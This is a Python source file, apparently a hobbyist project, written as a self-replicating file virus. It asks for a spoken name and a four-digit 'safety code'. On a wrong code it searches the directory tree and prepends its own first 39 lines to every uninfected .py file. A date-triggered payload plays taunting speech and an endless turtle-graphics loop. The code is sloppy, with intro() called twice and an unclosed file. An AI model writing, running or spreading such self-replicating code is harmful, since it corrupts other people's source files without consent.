import pyttsx3
import os
import datetime
import turtle
t = turtle.Turtle()
engine = pyttsx3.init()

engine.setProperty('rate', 150)
engine.setProperty('volume', 10)
def intro():
    x = input("Enter Your Name: ")
    engine.say("hello" + x)
    engine.runAndWait()
    safety_code = input("Enter four digit code (hint: Ripon College): ")
    return safety_code

SIGNATURE = "sig"

def search(path):

    filestoinfect = []

    filelist = os.listdir(path)

    for fname in filelist:

        if os.path.isdir(path+"/"+fname):

            filestoinfect.extend(search(path+"/"+fname))

        elif fname[-3:] == ".py":

            infected = False

            for line in open(path+"/"+fname):

                if SIGNATURE in line:

                    infected = True

                    break

            if infected == False:

                filestoinfect.append(path+"/"+fname)

    return filestoinfect




def infect(filestoinfect):

    virus = open(os.path.abspath(__file__))

    virusstring = ""

    for i,line in enumerate(virus):

        if i>=0 and i <39:

            virusstring += line

    virus.close

    for fname in filestoinfect:

        f = open(fname)

        temp = f.read()

        f.close()

        f = open(fname,"w")

        f.write(virusstring + temp)

        f.close()




def WillItInfect (safety_code, filestoinfect):
    if safety_code == "1851":
        engine.say("Your Computer Is safe Congrats!!!!!")
        engine.runAndWait()
    else:  
        Virus_infection(filestoinfect)
        


def Virus_infection(filestoinfect):
    engine.say("you are infected")
    engine.runAndWait()
    infect(filestoinfect)

def payload(t):
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        x = 1 
        y = "once apon a time there was a person who opened the wrong file. This is what happened"
        engine.say(y)
        engine.runAndWait()
        engine.say("you are infected ha ha ha ha ha ha ha")
        engine.runAndWait()
        go = 2
        if x == 1:
            while go == 2:
                x = 1
                y = 1
                t.fd(x)
                t.lt(y)
                x = x + 50
                y = y + 20
                


    

       

  
intro()
filestoinfect = search(os.path.abspath(""))
safety_code = intro()
payload(t)
WillItInfect(safety_code, filestoinfect)


